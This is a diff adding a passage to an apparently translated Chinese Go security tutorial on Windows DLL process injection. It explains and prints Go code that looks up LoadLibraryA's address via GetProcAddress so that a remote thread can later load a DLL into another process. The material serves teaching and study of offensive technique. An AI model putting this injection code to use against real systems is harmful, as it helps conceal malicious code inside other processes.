@@ -338,3 +338,32 @@ func WriteProcessMemory(i *Inject) error {
 首先注意的是`syscall`中的`BytePtrFromString()`函数，这是个方便将`string`转换成`byte`切片的函数，将返回结果赋值给`dllPathBytes`。
 
 最后，看下`unsafe.Pointer`的作用。`ProcWriteProcessMemory.Call`中的第三个参数在Windows API规范中定义为“lpBuffer——指向包含写入指定进程的地址空间的数据缓冲区的指针。” 为了将 `dllPathBytes` 中定义的 Go 指针传递 Windows 函数，使用`unsafe.Pointer`来规避类型转换。这里要说明的最后一点是 `uintptr` 和 `unsafe.Pointer` 可以放心地使用，因为这两者都是内联使用，并且没有赋值给返回值来重用。
+
+
+### 用Windows API `GetProcessAddress` 查找 `LoadLibraryA`
+
+`Kernel32.dll`有个名为 `LoadLibraryA()` 的函数，该函数对所有的Windows版本都适用。Microsoft文档声明`LoadLibraryA()`“将指定的模块加载到调用进程的地址空间中。 也可能会加载指定模块引用的其他模块。” 在创建执行实际进程注入所需远端线程前，需先获取到`LoadLibraryA()`的内存地址。 这就需要用到`GetLoadLibAddress()`函数——前面提到的那些支持函数之一（清单 12-10）。
+
+```go
+func GetLoadLibAddress(i *Inject) error {
+	var llibBytePtr *byte
+	llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA") 
+	if err != nil {
+		return err
+	}
+	lladdr, _, lastErr := ProcGetProcAddress.Callv(
+		ModKernel32.Handle(), // HMODULE hModule 
+		uintptr(unsafe.Pointer(llibBytePtr))) // LPCSTR lpProcName x
+	if &lladdr == nil {
+		return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")
+	}
+	i.LoadLibAddr = lladdr
+	fmt.Printf("[+] Kernel32.Dll memory address: %v\n", unsafe.Pointer(ModKernel32.Handle()))
+	fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))
+	return nil
+}
+```
+清单 12-10:
+使用Windows函数`GetProcessAddress()`获取`LoadLibraryA()`内存地址（/ch-12/procInjector/winsys/inject.go）
+
+使用 `GetProcessAddress()` Windows 函数来确定调用 `CreateRemoteThread()` 函数所需的 `LoadLibraryA() `的起始内存地址。 `ProcGetProcAddress.Call()` 函数有两个参数：第一个是 `Kernel32.dll` 的句柄，其中包含`LoadLibraryA() `，第二个是从字符串"LoadLibraryA"转换来的`byte`切片。
